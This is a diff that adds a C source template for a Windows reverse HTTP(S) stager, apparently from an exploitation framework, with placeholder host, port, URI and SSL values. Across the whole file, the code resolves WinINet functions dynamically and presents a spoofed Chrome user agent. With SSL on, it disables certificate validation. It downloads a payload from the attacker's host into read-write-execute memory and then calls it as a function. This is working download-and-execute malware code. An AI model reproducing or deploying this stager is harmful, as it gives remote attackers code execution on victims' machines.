@@ -1,0 +1,145 @@
+/*! @brief The user agent to use for the HTTP requests. */
+#define USER_AGENT "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36"
+
+%{DEFINITIONS}
+
+/*!
+ * @brief Connects to a provided host/port, downloads a payload and executes it.
+ * @param host String containing the name or IP of the host to connect to.
+ * @param port Port number to connect to.
+ * @param initialUri The URI to perform the connect back on (eg "/XXXX").
+ * @param useSSL Flag to indicate the use of SSL or not.
+ */
+
+VOID reverse_http_rdl(const char* host, u_short port, const char* initialUri, BOOL useSSL)
+{
+  typedef HINTERNET(__stdcall *InternetOpenProto)(LPCTSTR, DWORD, LPCSTR, LPCSTR, DWORD);
+  typedef HINTERNET(__stdcall *InternetConnectAProto)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
+  typedef HINTERNET(__stdcall *HttpOpenRequestAProto)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
+  typedef BOOL(__stdcall *InternetQueryOptionAProto)(HINTERNET, DWORD, LPVOID, LPDWORD);
+  typedef BOOL(__stdcall *InternetSetOptionAProto)(HINTERNET, DWORD, LPVOID, DWORD);
+  typedef BOOL(__stdcall *HttpSendRequestAProto)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
+  typedef BOOL(__stdcall *HttpQueryInfoAProto)(HINTERNET, DWORD, LPVOID, LPDWORD, LPDWORD);
+  typedef BOOL(__stdcall *InternetReadFileProto)(HINTERNET, LPVOID, DWORD, LPDWORD);
+  typedef BOOL(__stdcall *InternetCloseHandleProto)(HINTERNET);
+
+  HMODULE hMod = LoadLibraryA("Wininet.dll");
+  InternetOpenProto InternetOpenARDL = (InternetOpenProto) GetProcAddress(hMod, "InternetOpenA");
+  InternetConnectAProto InternetConnectARDL = (InternetConnectAProto) GetProcAddress(hMod, "InternetConnectA");
+  HttpOpenRequestAProto HttpOpenRequestARDL = (HttpOpenRequestAProto) GetProcAddress(hMod, "HttpOpenRequestA");
+  InternetQueryOptionAProto InternetQueryOptionARDL = (InternetQueryOptionAProto) GetProcAddress(hMod, "InternetQueryOptionA");
+  InternetSetOptionAProto InternetSetOptionARDL = (InternetSetOptionAProto) GetProcAddress(hMod, "InternetSetOptionA");
+  HttpSendRequestAProto HttpSendRequestARDL = (HttpSendRequestAProto) GetProcAddress(hMod, "HttpSendRequestA");
+  HttpQueryInfoAProto HttpQueryInfoARDL = (HttpQueryInfoAProto) GetProcAddress(hMod, "HttpQueryInfoA");
+  InternetReadFileProto InternetReadFileRDL = (InternetReadFileProto) GetProcAddress(hMod, "InternetReadFile");
+  InternetCloseHandleProto InternetClosehandleRDL = (InternetCloseHandleProto) GetProcAddress(hMod, "InternetCloseHandle");
+
+  HINTERNET hInternet = InternetOpenARDL(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+  if (hInternet == NULL)
+  {
+    return;
+  }
+
+  // Spin up a connection instance via the "entire internet" handle which we can use to make requests.
+  HINTERNET hConnect = InternetConnectARDL(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
+  if (hConnect == NULL)
+  {
+    return;
+  }
+
+  // SSL requires a magic set of flags to work propertly, plus we'll ignore the usual
+  // errors that you'd get in the browser when hitting dodgy certs.
+  DWORD flags = 0;
+  if (useSSL)
+  {
+    flags = INTERNET_FLAG_SECURE
+          | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+          | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+          | INTERNET_FLAG_NO_UI
+          | INTERNET_FLAG_NO_CACHE_WRITE;
+  }
+
+  // Initialise a request, but don't submit it yet.
+  const char* acceptTypes[] = { "text/*", NULL };
+  HINTERNET hRequest = HttpOpenRequestARDL(hConnect, "GET", initialUri, NULL, NULL, acceptTypes, flags, 0);
+  if (hRequest == NULL)
+  {
+    return;
+  }
+
+  // Again, in the case of SSL, we have to do some magic to make sure that the
+  // connection doesn't error out because of a bad/unknown CA.
+  if (useSSL)
+  {
+    DWORD secFlags;
+    DWORD secFlagsBuf = sizeof(secFlags);
+    InternetQueryOptionARDL(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, &secFlagsBuf);
+    secFlags |= (SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION );
+    InternetSetOptionARDL(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
+  }
+
+  // with everything out of the way, we can make the request to get the payload.
+    if (!HttpSendRequestARDL(hRequest, NULL, 0, NULL, 0))
+    {
+      // IN XP SP0 we have to set the flag for ignore unknwon CA AFTER it has already failed once
+      // So if we fail for that reason we set that flag here and retry it.
+      if (GetLastError() == 12045)
+      {
+          DWORD secFlags;
+          DWORD secFlagsBuf = sizeof(secFlags);
+          InternetQueryOptionARDL(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, &secFlagsBuf);
+          secFlags |= (SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION);
+          InternetSetOptionARDL(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
+          if (!HttpSendRequestARDL(hRequest, NULL, 0, NULL, 0))
+            {
+              return;
+            }
+      }
+      else
+      {
+          return;
+      }
+    }
+
+  // Find out the payload size
+  DWORD payloadSize = 0;
+  DWORD bytesRead = sizeof(payloadSize);
+  if (!HttpQueryInfoARDL(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &payloadSize, &bytesRead, NULL))
+  {
+    return;
+  }
+
+  // Prepare to read the whole request into memory.
+  char* payload = (char*)VirtualAlloc(0, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  if (payload == NULL)
+  {
+    return;
+  }
+
+  // Keep looping and reading until the whole payload is loaded.
+  DWORD totalBytesRead = 0;
+  while (totalBytesRead < payloadSize
+    && InternetReadFileRDL(hRequest, payload + totalBytesRead, payloadSize - totalBytesRead, &bytesRead)
+    && bytesRead != 0)
+  {
+    totalBytesRead += bytesRead;
+  }
+
+  // Close down the entire internet.
+  InternetClosehandleRDL(hRequest);
+  InternetClosehandleRDL(hConnect);
+  InternetClosehandleRDL(hInternet);
+
+  
+  // cast our payload to a function pointer and run it.
+  ((void(*)())payload)();
+}
+
+int main(void) {
+  
+  char host[256] = "%{HOST}";
+  short port = %{PORT};
+  char uri[512] = "%{URI}";
+  reverse_http_rdl(host, port, uri, %{SSL});
+  return 0;
+}
